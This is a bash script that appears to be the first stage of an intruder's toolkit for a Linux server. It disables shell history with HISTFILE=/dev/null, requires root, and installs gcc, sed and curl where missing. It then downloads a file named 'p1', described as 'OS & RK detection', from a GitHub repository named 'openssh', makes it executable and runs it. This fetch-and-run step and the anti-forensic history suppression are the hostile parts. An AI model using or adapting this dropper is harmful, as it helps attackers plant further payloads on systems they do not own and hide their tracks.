#!/bin/bash
############## first installation part (p)
############## check if the server has what we need installed

# echo -e "\033[0;31m [-] \033[0m\033[0m" # red
# echo -e "\033[0;32m [+] \033[0m\033[0m" # green
# echo -e "\033[0;36m xxx \033[0m\033[0m" #cyan
echo

export HISTFILE=/dev/null
export PATH=$PATH:/usr/local/sbin/
export PATH=$PATH:/usr/sbin/
export PATH=$PATH:/sbin
export PATH=$PATH:/bin


if [ "$(whoami)" != "root" ]; then
        echo -e "\033[0;31m [-] \033[0m\033[0m you are not root" # red
        echo; exit
fi

### check if what we use is installed
weneed="/usr/bin/gcc"
weinstall="gcc"
if [ -f $weneed ]; then
        echo -e "\033[0;32m [+] \033[0m\033[0m $weinstall found" # green
                ### we are testing gcc (some servers lack libraries)
                echo "#include <stdio.h>" > t.c
                echo "#include <pthread.h>" >> t.c
                echo "int main() {" >> t.c
                echo "sleep(1);" >> t.c
                echo "return 0;" >> t.c
                echo "}" >> t.c
                gcc -o t t.c 1>>/dev/null 2>>/dev/null
                if [ -f t ]; then
                        echo -e "\033[0;32m [+] \033[0m\033[0m $weinstall test was successful" # green
                        rm -rf t.c t
                else
                        echo -e "\033[0;31m [-] \033[0m\033[0m $weinstall test failed. aborting. " # red
                        echo "try to install libc6-dev: apt-get install -y libc6-dev"
                        rm -rf t.c
                        echo ; exit
                fi
                # EOF testam gcc (la unele servere lipsesc librarii)
else
        echo -e "\033[0;31m [-] \033[0m\033[0m $weinstall missing - trying to install... " # red
        if [ -f /usr/bin/yum ] ; then yum install -y $weinstall ; fi
        if [ -f /usr/bin/apt-get ] ; then apt-get update ; apt-get install -y $weinstall ; fi
        if [ -f /sbin/yast ] ; then yast -i $weinstall ; fi
        if [ -f /usr/bin/zypper ] ; then zypper -n install $weinstall ; fi

        if [ -f $weneed ]; then
                echo ; echo -e "\033[0;32m [+] \033[0m\033[0m $weinstall installed." # green
                ### we are testing gcc (some servers lack libraries)
                echo "#include <stdio.h>" > t.c
                echo "#include <pthread.h>" >> t.c
                echo "int main() {" >> t.c
                echo "sleep(1);" >> t.c
                echo "return 0;" >> t.c
                echo "}" >> t.c
                gcc -o t t.c 1>>/dev/null 2>>/dev/null
                if [ -f t ]; then
                        echo -e "\033[0;32m [+] \033[0m\033[0m $weinstall test was successful" # green
                        rm -rf t.c t
                else
                        echo -e "\033[0;31m [-] \033[0m\033[0m $weinstall test failed. aborting. " # red
                        echo "try to install libc6-dev: apt-get install -y libc6-dev"
                        rm -rf t.c
                        echo ; exit
                fi
                # EOF we are testing gcc (some servers lack libraries)
        else
                echo ; echo -e "\033[0;31m [-] \033[0m\033[0m $weinstall failed to install. aborting. " # red
                echo  ; exit
        fi
fi

weneed="/bin/sed"
weinstall="sed"
if [ -f $weneed ]; then
        echo -e "\033[0;32m [+] \033[0m\033[0m $weinstall found" # green
else
        echo -e "\033[0;31m [-] \033[0m\033[0m $weinstall missing - trying to install... " # red
        if [ -f /usr/bin/yum ] ; then yum install -y $weinstall ; fi
        if [ -f /usr/bin/apt-get ] ; then apt-get update ; apt-get install -y $weinstall ; fi
        if [ -f /sbin/yast ] ; then yast -i $weinstall ; fi
        if [ -f /usr/bin/zypper ] ; then zypper -n install $weinstall ; fi

        if [ -f $weneed ]; then
                echo ; echo -e "\033[0;32m [+] \033[0m\033[0m $weinstall installed." # green
        else
                echo ; echo -e "\033[0;31m [-] \033[0m\033[0m $weinstall failed to install. aborting. " # red
                echo  ; exit
        fi
fi

weneed="/usr/bin/curl"
weinstall="curl"
if [ -f $weneed ]; then
        echo -e "\033[0;32m [+] \033[0m\033[0m $weinstall found" # green
else
        echo -e "\033[0;31m [-] \033[0m\033[0m $weinstall missing - trying to install... " # red
        if [ -f /usr/bin/yum ] ; then yum install -y $weinstall ; fi
        if [ -f /usr/bin/apt-get ] ; then apt-get update ; apt-get install -y $weinstall ; fi
        if [ -f /sbin/yast ] ; then yast -i $weinstall ; fi
        if [ -f /usr/bin/zypper ] ; then zypper -n install $weinstall ; fi

        if [ -f $weneed ]; then
                echo ; echo -e "\033[0;32m [+] \033[0m\033[0m $weinstall installed." # green
        else
                echo ; echo -e "\033[0;31m [-] \033[0m\033[0m $weinstall failed to install. aborting. " # red
                echo  ; exit
        fi
fi
# EOF we check if what we use is installed

echo -e "\033[0;32m [+] \033[0m\033[0m downloading OS & RK detection (p1)" # green
rm -rf p1
curl --progress-bar -O https://github.com/amin-salem/openssh/blob/main//p1
if [ ! -f p1 ] ; then echo -e "\033[0;31m [-] \033[0m\033[0m file missing - download failed. aborting" ; echo ; exit ; fi
chmod +x p1 ; ./p1

